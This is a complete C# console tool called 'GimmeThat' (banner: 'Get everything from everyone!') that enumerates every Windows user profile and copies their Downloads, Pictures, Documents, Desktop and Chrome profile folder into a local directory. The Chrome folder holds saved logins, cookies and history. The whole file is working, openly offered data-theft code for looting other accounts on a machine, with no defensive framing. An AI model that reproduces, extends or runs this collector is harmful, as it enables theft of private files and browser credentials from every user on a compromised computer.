using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;

namespace GimmeThat
{
    class Program
    {
        public static bool download = false;
        public static bool pictures = false;
        public static bool documents = false;
        public static bool desktop = false;
        public static bool google = false;
        static void Main(string[] args)
        {
            banner();
            Arguments(args);

            checkFolder();

            Console.WriteLine("[+] Found users directories: ");
            foreach(string folder in getDirectories())
            {
                Console.WriteLine(folder);
            }

            if (download)
                copyFolder("downloads", getDirectories());

            if (pictures)
                copyFolder("pictures", getDirectories());

            if (documents)
                copyFolder("documents", getDirectories());

            if (desktop)
                copyFolder("desktop", getDirectories());

            if (google)
                copyFolder(@"AppData\Local\Google", getDirectories()); //it will get the chrome folder

            Console.WriteLine("[+] Program execution finished. Files and folders saved in: " + Directory.GetCurrentDirectory() + "\\files");
        }
        public static void banner()
        {
            Console.WriteLine("   _____ _                       _______ _           _   ");
            Console.WriteLine("  / ____(_)                     |__   __| |         | |  ");
            Console.WriteLine(" | |  __ _ _ __ ___  _ __ ___   ___| |  | |__   __ _| |_ ");
            Console.WriteLine(@" | | |_ | | '_ ` _ \| '_ ` _ \ / _ \ |  | '_ \ / _` | __|");
            Console.WriteLine(" | |__| | | | | | | | | | | | |  __/ |  | | | | (_| | |_ ");
            Console.WriteLine(@"  \_____|_|_| |_| |_|_| |_| |_|\___|_|  |_| |_|\__,_|\__|");
            Console.WriteLine("\n               Get everything from everyone! \n");

        }
        public static void help()
        {
            Console.WriteLine("[+] Usage: ");
            Console.WriteLine("   -google --> Get google folders ");
            Console.WriteLine("   -d --> Get document folders and files ");
            Console.WriteLine("   -p --> Get pictures folders and files ");
            Console.WriteLine("   -s --> Get desktop folders and files ");
            Console.WriteLine("   -w --> Get download folders and files ");
            Environment.Exit(0);
        }
        private static void checkFolder()
        {
            if (!Directory.Exists("files"))
                Directory.CreateDirectory("files");
        }
        public static string[] getDirectories()
        {
            string path = @"C:\Users\";
            string[] files = Directory.GetDirectories(path);
            return files;
        }
        public static void copyFolder(string path, string[] users)
        {
            foreach(string i in users)
            {
                string destinyPath = Directory.GetCurrentDirectory()+@"\files\" + path + "_" + i.Replace(@"\", "").Replace(@":", "");
                Directory.CreateDirectory(destinyPath);
                try
                {
                    //copy only files here
                    string folder = i + @"\"+path; 
                    string[] files = Directory.GetFiles(folder);
                    foreach (string item in files)
                    {
                        Console.WriteLine(item);
                        File.Copy(item, destinyPath+"\\"+Path.GetFileName(item), true);
                    }

                    //copy directories here
                    string[] directories = Directory.GetDirectories(folder);
                    int a = 0;
                    foreach(string dir in directories)
                    {
                        a++;
                        Console.WriteLine(dir);
                        copyDirectory(dir, destinyPath + "\\" + a.ToString());
                    }
  
                }
                catch(Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }
        public static void copyDirectory(string origemDiretorio, string destinoDiretorio)
        {

            DirectoryInfo origemInfo = new DirectoryInfo(origemDiretorio);
            DirectoryInfo destinoInfo = new DirectoryInfo(destinoDiretorio);

            if (!origemInfo.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Directory was not found " + origemDiretorio);
            }

            if (!Directory.Exists(destinoDiretorio))
            {
                Directory.CreateDirectory(destinoDiretorio);
            }

            foreach (FileInfo arquivo in origemInfo.GetFiles())
            {
                string destinoArquivo = Path.Combine(destinoDiretorio, arquivo.Name);
                arquivo.CopyTo(destinoArquivo, false);
            }

            foreach (DirectoryInfo subdiretorio in origemInfo.GetDirectories())
            {
                string novoDestinoDiretorio = Path.Combine(destinoDiretorio, subdiretorio.Name);
                copyDirectory(subdiretorio.FullName, novoDestinoDiretorio);
            }
        }

        public static void Arguments(string[] args)
        {
            if (args.Length < 1)
            {
                help();
            }
            else
            {
                foreach (string argument in args)
                {
                    switch (argument)
                    {
                        case "-google":
                            google = true;
                            break;
                        case "-d":
                            documents = true;
                            break;
                        case "-p":
                            pictures = true;
                            break;
                        case "-s":
                            desktop = true;
                            break;
                        case "-w":
                            download = true;
                            break;
                        default:
                            help();
                            break;

                    }
                }
            }
        }
        
    }
    
}
